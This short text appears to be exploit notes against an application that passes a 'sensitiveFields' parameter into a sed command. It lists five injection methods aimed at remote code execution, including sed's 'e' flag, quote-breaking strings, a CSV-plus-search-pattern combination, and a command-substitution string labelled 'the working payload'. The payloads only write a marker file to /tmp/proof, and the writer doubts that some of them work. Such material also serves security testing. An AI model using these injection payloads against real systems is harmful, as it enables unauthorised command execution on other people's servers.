Payload for sensitiveFields parameter to achieve RCE:

Method 1 - Using sed's e flag (GNU sed):
/e echo 'hello' > /tmp/proof

Method 2 - Pattern that might break sed structure:
.*'; echo 'hello' > /tmp/proof; echo '.*

Method 3 - Most reliable - Exploiting the unescaped tempFile:
This requires controlling the tempFile path, which is harder.

Method 4 - Using CSV content + search pattern combination:
Upload CSV with: test'; echo 'hello' > /tmp/proof; echo 'end
Search for: test

The key insight is that the command becomes:
sed -i 's^'test'\; echo '\''hello'\'' > /tmp/proof; echo '\''end'^REDACTED^g' /tmp/file

This might still be escaped properly.

Method 5 - The working payload (requires GNU sed with -e flag):
Use this exact string as sensitiveFields:
.*'$(echo 'hello' > /tmp/proof)'.*

This exploits command substitution within the sed pattern.
